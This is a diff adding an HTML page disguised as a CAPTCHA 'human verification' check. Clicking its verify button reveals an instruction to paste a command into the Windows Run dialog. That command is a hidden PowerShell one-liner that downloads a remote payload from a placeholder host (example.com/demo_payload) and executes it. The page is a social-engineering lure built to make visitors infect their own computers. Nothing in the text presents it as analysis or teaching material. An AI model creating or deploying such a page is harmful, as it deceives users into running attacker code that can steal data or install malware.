@@ -1,0 +1,50 @@
+<html>
+  <head>
+    <title>Captcha Verification</title>
+    <style>
+      body {
+        background-color: #f2f2f2;
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin-top: 100px;
+      }
+      .container {
+        background-color: white;
+        padding: 40px;
+        margin: auto;
+        width: 50%;
+        box-shadow: 0 0 20px rgba(0,0,0,0.2);
+        border-radius: 10px;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 16px;
+        background-color: #4285f4;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      code {
+        background-color: #eee;
+        padding: 10px;
+        display: block;
+        margin-top: 20px;
+        border-radius: 5px;
+        font-size: 14px;
+        word-break: break-all;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Human Verification Required</h1>
+      <p>Click the button below to prove you're not a robot.</p>
+      <button onclick="document.getElementById('ps1').style.display='block'">Click to Verify</button>
+      <div id="ps1" style="display:none;">
+        <p>Copy and paste the following into the Windows Run dialog (Win + R):</p>
+        <code>powershell -w hidden -nop -c "iex(New-Object Net.WebClient).DownloadString('https://example.com/demo_payload')"</code>
+      </div>
+    </div>
+  </body>
+</html>
